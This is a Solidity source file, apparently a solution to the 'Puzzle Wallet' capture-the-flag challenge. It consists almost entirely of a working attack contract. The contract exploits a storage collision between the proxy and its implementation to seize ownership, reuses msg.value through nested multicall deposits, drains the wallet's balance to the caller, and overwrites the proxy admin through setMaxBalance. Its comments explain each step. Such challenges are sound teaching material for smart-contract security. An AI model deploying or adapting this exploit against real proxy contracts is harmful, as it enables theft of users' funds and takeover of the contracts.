// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface IPuzzleProxy {
    function proposeNewAdmin(address _newAdmin) external;
    function approveNewAdmin(address _expectedAdmin) external;
    function upgradeTo(address _newImplementation) external;
    function pendingAdmin() external view returns (address pendingAdm);
    function admin() external view returns (address currentAdm);
}

interface IPuzzleImplementation {
    function init(uint256 _maxBalance) external;
    function setMaxBalance(uint256 _maxBalance) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function multicall(bytes[] calldata data) external payable;
    function owner() external view returns (address curOwner);
    function maxBalance() external view returns (uint256 maxBal);
    function whitelisted(address addr) external view returns (bool isAddrInWL);
    function balances(address addr) external view returns (uint256 addrBal);
}

interface IPuzzleWallet is IPuzzleProxy, IPuzzleImplementation {}

contract MyPuzzleWalletAttack {
    constructor(address walletAddr) payable {
        IPuzzleWallet wallet = IPuzzleWallet(walletAddr);

        // There is storage collision between proxy and implementation contracts.
        // PendingAdmin variable takes 0th slot of proxy.
        // By overwriting 0th slot of proxy contract, we'll also change contents of the owner storage variable
        // of the implementation contract.
        wallet.proposeNewAdmin(address(this));

        // whitelist yourself
        wallet.addToWhitelist(address(this));

        // prepare calldata for multicall, we'll pass 2 call requests there
        // first we'll call deposit()
        bytes[] memory depositCallData = new bytes[](1);
        bytes[] memory multicallCallData = new bytes[](2);
        depositCallData[0] = abi.encodeWithSelector(wallet.deposit.selector);
        multicallCallData[0] = depositCallData[0];

        // second, we'll call multicall function itself with deposit() as calldata
        // this way we'll pass through `selector == this.deposit.selector)` check,
        // because selector relates to `multicall` function
        // and msg.value will be reused (2 calls to deposit() function)
        multicallCallData[1] = abi.encodeWithSelector(wallet.multicall.selector, depositCallData);

        // execute multicall
        wallet.multicall{ value: msg.value }(multicallCallData);

        // here we just send doubled value to the attacker
        // balance of the contract will be empty after that
        wallet.execute(msg.sender, msg.value * 2, "");

        // now the contract balance is zero, and we can change maxBalance
        // as there is storage collision of implementation's maxBalance variable
        // with the proxy's admin variable, setting of the maxBalance variable will rewrire proxy admin
        // so we need to write attacker address there

        wallet.setMaxBalance(uint256(uint160(msg.sender)));
    }
}
